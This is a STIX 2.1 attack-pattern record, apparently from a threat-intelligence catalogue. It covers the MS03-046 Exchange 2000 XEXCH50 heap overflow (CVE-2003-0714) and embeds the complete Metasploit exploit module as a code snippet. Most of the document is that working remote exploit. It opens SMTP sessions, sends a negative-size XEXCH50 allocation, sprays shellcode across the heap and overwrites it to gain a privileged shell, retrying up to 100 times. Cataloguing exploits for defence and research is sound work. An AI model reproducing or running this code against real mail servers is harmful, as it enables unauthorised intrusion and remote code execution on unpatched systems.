{
    "type": "attack-pattern",
    "spec_version": "2.1",
    "id": "attack-pattern--9e7416b8-fcf9-41e2-b771-5257c8288901",
    "created": "2024-08-14T16:38:38.617515Z",
    "modified": "2024-08-14T16:38:38.617519Z",
    "name": "MS03-046 Exchange 2000 XEXCH50 Heap Overflow",
    "description": " This is an exploit for the Exchange 2000 heap overflow. Due to the nature of the vulnerability, this exploit is not very reliable. This module has been tested against Exchange 2000 SP0 and SP3 running a Windows 2000 system patched to SP4. It normally takes between one and 100 connection attempts to successfully obtain a shell. This exploit is *very* unreliable. ",
    "external_references": [
        {
            "source_name": "metasploit",
            "url": "https://github.com/rapid7/metasploit-framework/blob/master/exploits/windows/smtp/ms03_046_exchange2000_xexch50.rb",
            "external_id": "ms03_046_exchange2000_xexch50.rb"
        },
        {
            "source_name": "CVE",
            "external_id": "2003-0714"
        }
    ],
    "x_code_snippet": "##\n# This module requires Metasploit: https://metasploit.com/download\n# Current source: https://github.com/rapid7/metasploit-framework\n##\n\nclass MetasploitModule < Msf::Exploit::Remote\n  Rank = GoodRanking\n\n  include Msf::Exploit::Remote::Tcp\n\n  def initialize(info = {})\n    super(update_info(info,\n      'Name'           => 'MS03-046 Exchange 2000 XEXCH50 Heap Overflow',\n      'Description'    => %q{\n          This is an exploit for the Exchange 2000 heap overflow. Due\n        to the nature of the vulnerability, this exploit is not very\n        reliable. This module has been tested against Exchange 2000\n        SP0 and SP3 running a Windows 2000 system patched to SP4. It\n        normally takes between one and 100 connection attempts to\n        successfully obtain a shell. This exploit is *very* unreliable.\n      },\n      'Author'         =>\n        [\n          'hdm', # original module\n          'aushack', # msf3 port :)\n        ],\n      'References'     =>\n        [\n          [ 'CVE', '2003-0714' ],\n          [ 'BID', '8838' ],\n          [ 'OSVDB', '2674' ],\n          [ 'MSB', 'MS03-046' ],\n          [ 'EDB', '113' ],\n        ],\n      'DefaultOptions' =>\n        {\n          'EXITFUNC' => 'seh',\n        },\n      'Platform'       => 'win',\n      'Privileged'     => true,\n      'Payload'        =>\n        {\n          'Space'    => 1024,\n          'BadChars' => \"\\x00\\x0a\\x0d\\x20:=+\\x22\",\n          'StackAdjustment' => -3500,\n        },\n      'Targets'        =>\n        [\n          [ 'Exchange 2000', { 'Ret' => 0x0c900c90, 'BuffLen' => 3000, 'Offset1' => 11000, 'Offset2' => 512 } ],\n        ],\n      'DefaultTarget'  => 0,\n      'DisclosureDate' => '2003-10-15'))\n\n    register_options(\n      [\n        Opt::RPORT(25),\n        OptString.new('MAILFROM', [ true, 'The FROM address of the e-mail', 'random@example.com']),\n        OptString.new('MAILTO', [ true, 'The TO address of the e-mail', 'administrator']),\n        OptInt.new('ATTEMPTS', [ true, 'The number of exploit attempts before halting', 100]),\n      ])\n  end\n\n  def check\n    connect\n    banner = sock.get_once || ''\n\n    if (banner !~ /Microsoft/)\n      print_status(\"Target does not appear to be an Exchange server.\")\n      return Exploit::CheckCode::Safe\n    end\n\n    sock.put(\"EHLO #{Rex::Text.rand_text_alpha(1)}\\r\\n\")\n    res = sock.get_once || ''\n    if (res !~ /XEXCH50/)\n      print_status(\"Target does not appear to be an Exchange server.\")\n      return Exploit::CheckCode::Safe\n    end\n    sock.put(\"MAIL FROM: #{datastore['MAILFROM']}\\r\\n\")\n    res = sock.get_once || ''\n\n    if (res =~ /Sender OK/)\n      sock.put(\"RCPT TO: #{datastore['MAILTO']}\\r\\n\")\n      res = sock.get_once || ''\n      if (res =~ /250/)\n        sock.put(\"XEXCH50 2 2\\r\\n\")\n        res = sock.get_once || ''\n        if (res !~ /Send binary data/)\n          print_error(\"Target has been patched!\")\n          return Exploit::CheckCode::Detected\n        else\n          return Exploit::CheckCode::Appears\n        end\n      end\n    end\n\n    disconnect\n  end\n\n  def smtp_setup(count)\n    print_status(\"Exploit attempt ##{count}\")\n\n    connect\n    select(nil,nil,nil,1)\n    banner = sock.get_once || ''\n    print_status(\"Connected to SMTP server: #{banner.to_s}\")\n\n    if (banner !~ /Microsoft/)\n      print_status(\"Target does not appear to be running Exchange.\")\n      return\n    end\n\n    select(nil,nil,nil,5)\n    sock.put(\"EHLO X\\r\\n\")\n    select(nil,nil,nil,7)\n    res = sock.get_once || ''\n\n    if (res !~ /XEXCH50/)\n      print_status(\"Target is not running Exchange.\")\n      return\n    end\n\n    sock.put(\"MAIL FROM: #{datastore['MAILFROM']}\\r\\n\")\n    select(nil,nil,nil,3)\n\n    sock.put(\"RCPT TO: #{datastore['MAILTO']}\\r\\n\")\n    select(nil,nil,nil,3)\n\n  end\n\n  def exploit\n    bufflen = target['BuffLen']\n    print_status(\"Trying to exploit #{target.name} with address 0x%.8x...\" % target['Ret'])\n    count = 1 # broke\n\n    begin\n      if (count > datastore['ATTEMPTS'])\n        print_error(\"Exploit failed after #{datastore['ATTEMPTS']}. Set ATTEMPTS to a higher value if desired.\")\n        return # Stop after a specified number of attempts.\n      end\n\n      if (session_created?)\n        return # Stop the attack. Non-session payloads will continue regardless up to ATTEMPTS.\n      end\n\n      while(true)\n        if (smtp_setup(count))\n          print_status(\"Connection 1: \")\n        end\n\n        sock.put(\"XEXCH50 2 2\\r\\n\")\n        select(nil,nil,nil,3)\n        res = sock.get_once\n        print_status(\"#{res}\")\n        if (res !~ /Send binary data/)\n          print_status(\"Target is not vulnerable.\")\n          return # commented out for the moment\n        end\n\n        sock.put(\"XX\")\n\n        print_status(\"ALLOC\")\n\n        size = 1024 * 1024 * 32\n\n        sock.put(\"XEXCH50 #{size} 2\\r\\n\")\n        select(nil,nil,nil,3)\n\n        sploit = (([target['Ret']].pack('V')) * 256 * 1024 + payload.encoded + (\"X\" * 1024)) * 4 + \"BEEF\"\n\n        print_status(\"Uploading shellcode to remote heap.\")\n\n        if (sock.put(sploit))\n          print_status(\"\\tOK.\")\n        end\n\n        print_status(\"Connection 2: \")\n        smtp_setup(count) # Connection 2\n\n        sock.put(\"XEXCH50 -1 2\\r\\n\") # Allocate negative value\n        select(nil,nil,nil,2)\n        res = sock.get_once || ''\n\n        if (!res)\n          print_error(\"Error - no response\")\n        end\n\n        print_status(\"OK\")\n\n        bufflen += target['Offset2']\n\n        if (bufflen > target['Offset1'])\n          bufflen = target['BuffLen']\n        end\n\n        heapover = [target['Ret']].pack('V') * bufflen\n        print_status(\"Overwriting heap with payload jump (#{bufflen})\")\n        sock.put(heapover)\n\n        print_status(\"Starting reconnect sequences...\")\n\n        10.times do |x|\n          print_status(\"Connect #{x}\")\n          connect\n          sock.put(\"HELO X\\r\\n\")\n          disconnect\n        end\n      end\n\n    rescue\n      print_status(\"Unable to connect or Exchange has crashed... Retrying.\")\n      count += 1\n      retry\n    end\n\n    disconnect\n  end\nend\n",
    "x_mitre_disclosure_date": "2003-10-15",
    "x_mitre_platforms": [
        "win'"
    ]
}